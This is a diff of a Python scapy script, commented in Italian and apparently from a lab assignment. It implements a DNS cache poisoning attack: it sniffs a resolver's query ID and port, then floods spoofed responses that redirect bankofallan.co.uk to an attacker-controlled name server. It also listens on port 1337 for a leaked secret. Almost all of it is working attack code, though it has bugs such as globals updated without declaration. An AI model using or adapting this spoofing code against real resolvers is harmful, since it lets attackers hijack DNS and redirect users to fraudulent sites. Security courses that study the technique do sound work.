@@ -17,12 +17,16 @@ from scapy.layers.inet import *
 from scapy.layers.dns import *
 from scapy.all import *
 
+DNS_SPOOF_IP = "10.0.0.1"
+BAD_DNS_IP = "192.168.56.1"
+VULN_DNS_IP = "192.168.56.101"
+
 Q_ID = 0                # query ID globale
 PORT_NUMBER = 0         # porta da catturare
 
 
-GOAL = 0                # va a 1 se riesco nell'attacco      TODO
-RESTART = 0             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1
+GOAL = 0                # va a 1 se riesco nell'attacco
+RESTART = 0             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1 (cioè no poisoning)
 
 class FirstThread(Thread):
 
@@ -33,24 +37,27 @@ class FirstThread(Thread):
                 self.flood = flood
 
         def run(self):
-                print ("Thread '" + self.name + "' avviato")
+                #print ("Thread '" + self.name + "' avviato")
                 # time.sleep(self.durata)
 
                 if self.job == 0:                                                       # sniffer
                         sniffer_job()
-                        print ("Thread '" + self.name + "' terminato")
+                        #print ("Thread '" + self.name + "' terminato")
 
                 if self.job == 1:                                                       # sender
                         time.sleep(1)
                         sender_job()
-                        print ("Thread '" + self.name + "' terminato")
+                        #print ("Thread '" + self.name + "' terminato")
 
                 if self.job == 2:                                                       # bad client
                         sender_job_2()
-                        print ("Thread '" + self.name + "' terminato")
+                        #print ("Thread '" + self.name + "' terminato")
 
                 if self.job == 3:                                                       # flooder
                         flooding_job(self.flood)
+
+                if self.job == 4:                                                       # in ascolto per il secret
+                        secret_job()
 
 
 
@@ -59,10 +66,9 @@ def sender_job():
         invio la prima query DNS per badguy.ru
         :return:
         '''
-        send(IP(dst="192.168.56.101") / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
+        send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
         #pkt = sr1(IP(dst="192.168.56.101") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
         # p.show()
-
 
 def sniffer_job():
         '''
@@ -71,13 +77,15 @@ def sniffer_job():
         :return:
         '''
         #pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", prn=lambda x: x.summary())
-        pkts = sniff(count=4, timeout=2, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", lfilter=lambda pkt: pkt.haslayer(DNS))
+        #pkts = sniff(count=4, timeout=2, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", lfilter=lambda pkt: pkt.haslayer(DNS))
+        pkts = sniff(count=4, timeout=2,
+                     filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53",
+                     lfilter=lambda pkt: pkt.haslayer(DNS))
 
-        print ('trovati ' + str(len(pkts)) + ' pacchetti')
-        qID = pkts[0].getlayer(DNS).id
-        port = pkts[0].getlayer(UDP).sport
-        print ('found qID: ' + str(hex(qID)))
-        print ('found port: ' + str(port))
+        #print ('trovati ' + str(len(pkts)) + ' pacchetti')
+        Q_ID = pkts[0].getlayer(DNS).id
+        PORT_NUMBER = pkts[0].getlayer(UDP).sport
+
 
 def sender_job_2():
         '''
@@ -85,8 +93,13 @@ def sender_job_2():
         :return:
         '''
 
-        send(IP(dst="192.168.56.101") / UDP() / DNS(rd=1, qd=DNSQR(qname="bankofallan.co.uk")))
-
+        response = sr1(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="bankofallan.co.uk")))
+        # TODO valutare se an o ar e togliere la print
+        print response[0].getlayer(DNS).an.rdata
+        if response[0].getlayer(DNS).an.rdata == DNS_SPOOF_IP:
+                RESTART = 1
+        else:
+                GOAL = 1
 
 def flooding_job(passo):
         '''
@@ -94,8 +107,6 @@ def flooding_job(passo):
         :param passo:
         :return:
         '''
-
-        # TODO [FABIO] finire
 
         '''
         # build the packet
@@ -115,39 +126,64 @@ def flooding_job(passo):
             print('sending spoof packet')
             send(pkt, verbose=0)
         '''
-        for count in range(Q_ID+1+(passo*125),Q_ID+((passo+1)*125)):
+        for count in range(Q_ID+1+(passo*125), Q_ID+((passo+1)*125)):
                 # mando pacchetti con il qID che varia
-                send(IP(dst="192.168.56.101", src="10.0.0.1") / UDP(sport=53, dport=PORT_NUMBER) / DNS(rd=1, qd=DNS(qname="badguy.ru")))
+
+                #send(IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / DNS(rd=1, qd=DNS(qname="badguy.ru")))
+
                 # build the packet
-                pkt = IP(dst="192.168.56.101", src="10.0.0.1") / UDP(sport=53, dport=PORT_NUMBER) / \
-                      DNS(id=Q_ID, qr=1L, opcode='QUERY', aa=0L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
+                pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
+                      DNS(id=count, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                           qdcount=1, ancount=1,
                           nscount=0, arcount=0,
-                          qd=(DNSQR(qname='bankofallan.co.uk', qtype='A', qclass='IN')),
+                          qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
                           an=None,
-                          ns=(DNSRR(rrname=domain, type='NS', rclass='IN', ttl=60000, rdlen=24, rdata=dnsspoof)),
-                          ar=(DNSRR(rrname=dnsspoof, type='A', rclass='IN', ttl=60000, rdlen=4, rdata=targetip)) /
+                          ns=(DNSRR(rrname='co.uk', type='NS', rclass='IN', ttl=60000, rdlen=24, rdata='bankofallan.co.uk')),
+                          ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4, rdata=BAD_DNS_IP)) /
                              DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
+                send(pkt, verbose=0)
+
+def secret_job():
+        # pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", prn=lambda x: x.summary())
+        scrt_pkt = sniff(count=1, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 1337")
+        print "got secret!"
+        scrt_pkt[0].show()
+
+
+
+
+
 
 
 ############################ MAIN ##################à
 # TODO start del thread in ascolto su 1337 prima degli altri
 
-def main():
+def main_job():
         '''
-
-        - il bad_client e i 4 flooders devono partire sulla stessa condizione (cioè Q_ID != 0 and PORT_NUMBER != 0)
-        -
+        - il bad client e i  flooders devono partire sulla stessa condizione (cioè qID e PORT diversi da 0)
         :return:
         '''
+
+
         while GOAL == 0:
                 RESTART = 0
 
                 # Creazione dei thread
                 sniffer_thread = FirstThread(name="sniffer", job=0)
                 first_sender_thread = FirstThread(name="first sender", job=1)
-                bad_client_thread = FirstThread(name="bad client", job=2)
+                sniffer_thread.start()
+                first_sender_thread.start()
+                sniffer_thread.join()
+                first_sender_thread.join()
 
+                print ('found qID: ' + str(hex(Q_ID)))
+                print ('found port: ' + str(PORT_NUMBER))
+
+                if (Q_ID == 0 or PORT_NUMBER == 0):
+                        print '[MAIN] error on qID or port'
+                        pass
+
+                bad_client_thread = FirstThread(name="bad client", job=2)
                 flooder_0 = FirstThread(name="flood0", job=3, flood=0)
                 flooder_1 = FirstThread(name="flood1", job=3, flood=1)
                 flooder_2 = FirstThread(name="flood2", job=3, flood=2)
@@ -157,20 +193,29 @@ def main():
                 flooder_6 = FirstThread(name="flood3", job=3, flood=6)
                 flooder_7 = FirstThread(name="flood3", job=3, flood=7)
 
-                # Avvio dei thread
-                sniffer_thread.start()
-                first_sender_thread.start()
 
-                '''if (Q_ID == 0 or PORT_NUMBER == 0):
-                        print '[MAIN] error on qID or port'
-                        pass'''
 
+                # TODO sinconia tra bad client e flooders
                 bad_client_thread.start()
+                flooder_0.start()
+                flooder_1.start()
+                flooder_2.start()
+                flooder_3.start()
+                flooder_4.start()
+                flooder_5.start()
+                flooder_6.start()
+                flooder_7.start()
 
 
 
-
-                sniffer_thread.join()
-                first_sender_thread.join()
                 bad_client_thread.join()
+                flooder_0.join()
+                flooder_1.join()
+                flooder_2.join()
+                flooder_3.join()
+                flooder_4.join()
+                flooder_5.join()
+                flooder_6.join()
+                flooder_7.join()
 
+        print "Goal reached."
